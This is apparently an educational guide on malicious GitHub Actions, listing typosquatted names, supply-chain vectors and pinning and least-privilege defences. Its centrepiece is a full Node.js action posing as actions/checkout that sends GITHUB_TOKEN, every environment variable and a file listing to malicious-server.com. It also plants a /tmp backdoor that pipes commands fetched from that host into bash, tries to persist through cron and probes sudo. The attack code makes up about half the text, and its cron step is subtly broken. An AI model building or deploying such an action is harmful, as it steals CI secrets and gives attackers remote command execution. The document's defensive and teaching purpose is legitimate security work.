# Malicious GitHub Action Example

## Overview
This document demonstrates how malicious GitHub Actions can be created and used for security testing purposes.

## Attack Vectors

### 1. Typosquatting
Create actions with similar names to legitimate ones:
- `actions/checkout` → `actions/check0ut`
- `actions/setup-node` → `actions/setup-n0de`
- `actions/upload-artifact` → `actions/upload-artifacts`

### 2. Supply Chain Compromise
Compromise legitimate action repositories:
- Social engineering maintainers
- Exploit vulnerabilities in dependencies
- Malicious pull requests

### 3. Malicious Fork
Fork legitimate actions and add malicious code:
- Add backdoors to existing functionality
- Exfiltrate data while maintaining original behavior
- Persist access through various mechanisms

## Example Malicious Action

### action.yml
```yaml
name: 'Malicious Checkout Action'
description: 'A malicious version of the checkout action'
inputs:
  repository:
    description: 'Repository to checkout'
    required: true
  token:
    description: 'Token for authentication'
    required: false
runs:
  using: 'node16'
  main: 'index.js'
```

### index.js
```javascript
const core = require('@actions/core');
const exec = require('@actions/exec');
const fs = require('fs');
const https = require('https');

async function run() {
  try {
    // Legitimate functionality
    const repository = core.getInput('repository');
    const token = core.getInput('token');
    
    // Checkout the repository (legitimate behavior)
    await exec.exec('git', ['clone', `https://github.com/${repository}.git`]);
    
    // Malicious functionality (hidden)
    await exfiltrateData();
    await establishPersistence();
    await escalatePrivileges();
    
  } catch (error) {
    core.setFailed(error.message);
  }
}

async function exfiltrateData() {
  // Collect sensitive information
  const data = {
    repository: process.env.GITHUB_REPOSITORY,
    actor: process.env.GITHUB_ACTOR,
    token: process.env.GITHUB_TOKEN,
    secrets: process.env,
    files: await getFileList()
  };
  
  // Exfiltrate to external endpoint
  const postData = JSON.stringify(data);
  const options = {
    hostname: 'malicious-server.com',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };
  
  const req = https.request(options, (res) => {
    console.log('Data exfiltrated successfully');
  });
  
  req.write(postData);
  req.end();
}

async function establishPersistence() {
  // Create backdoor files
  const backdoorScript = `
#!/bin/bash
while true; do
  curl -s https://malicious-server.com/commands | bash
  sleep 300
done
  `;
  
  fs.writeFileSync('/tmp/.systemd', backdoorScript);
  fs.chmodSync('/tmp/.systemd', '755');
  
  // Add to crontab
  await exec.exec('crontab', ['-l'], { silent: true });
  await exec.exec('echo', ['*/5 * * * * /tmp/.systemd'], { silent: true });
}

async function escalatePrivileges() {
  // Attempt privilege escalation
  try {
    await exec.exec('sudo', ['-n', 'id'], { silent: true });
    console.log('Privilege escalation successful');
  } catch (error) {
    console.log('Privilege escalation failed');
  }
}

async function getFileList() {
  // Collect file information
  const files = [];
  const walkDir = (dir) => {
    const items = fs.readdirSync(dir);
    items.forEach(item => {
      const fullPath = `${dir}/${item}`;
      const stat = fs.statSync(fullPath);
      if (stat.isDirectory()) {
        walkDir(fullPath);
      } else {
        files.push(fullPath);
      }
    });
  };
  
  walkDir('.');
  return files;
}

run();
```

## Detection and Prevention

### 1. Action Pinning
Always pin actions to specific commit SHAs:
```yaml
- uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3
```

### 2. Action Review
- Review action source code before use
- Check action maintainer reputation
- Verify action authenticity

### 3. Least Privilege
- Use minimal required permissions
- Avoid unnecessary secrets
- Limit action scope

### 4. Monitoring
- Monitor action usage and changes
- Implement security scanning
- Use dependency analysis tools

### 5. Self-Hosted Runners
- Use self-hosted runners for sensitive workloads
- Implement network isolation
- Monitor runner activities

## Security Testing

### 1. Controlled Environment
- Use isolated test repositories
- Implement network restrictions
- Monitor all activities

### 2. Ethical Considerations
- Only test on your own repositories
- Obtain proper authorization
- Document all testing activities

### 3. Reporting
- Document findings
- Provide remediation recommendations
- Share knowledge with security team

## Conclusion

GitHub Actions provide powerful automation capabilities but also introduce new attack vectors. Understanding these threats and implementing proper security controls is essential for maintaining a secure CI/CD pipeline.

## References

- [GitHub Actions Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
- [GitHub Actions Security](https://github.com/features/security)
